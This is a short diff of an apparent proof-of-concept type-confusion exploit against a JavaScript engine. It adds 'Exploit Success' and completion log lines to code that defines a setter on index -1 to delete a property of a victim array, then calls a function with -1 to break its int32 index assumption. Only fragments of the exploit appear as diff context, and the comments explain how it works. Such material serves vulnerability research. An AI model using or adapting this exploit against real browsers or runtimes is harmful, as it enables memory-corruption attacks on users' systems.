@@ -1,6 +1,7 @@
 let arr1 = []; // Create a victim array to be manipulated
 let arr2 = [1.1, 2.2, , 4.4]; // Create the array that will cause the side effects
 arr2.__defineSetter__("-1", function(x) { // Set the side-effect for the index -1
+    console.log("Exploit Success");
     delete arr1.x; // Delete the property x of the victim array
 });
 {
@@ -20,3 +21,5 @@ arr2.__defineSetter__("-1", function(x) { // Set the side-effect for the index -
     }
     f(true, -1); // Finally, run the function with the first parameter as true, and the second as a number that will trigger the side effects. Since the type of index is expected to be an int32, -1 still works
 }
+
+console.log("Done TypeConfusion exploit.\n");
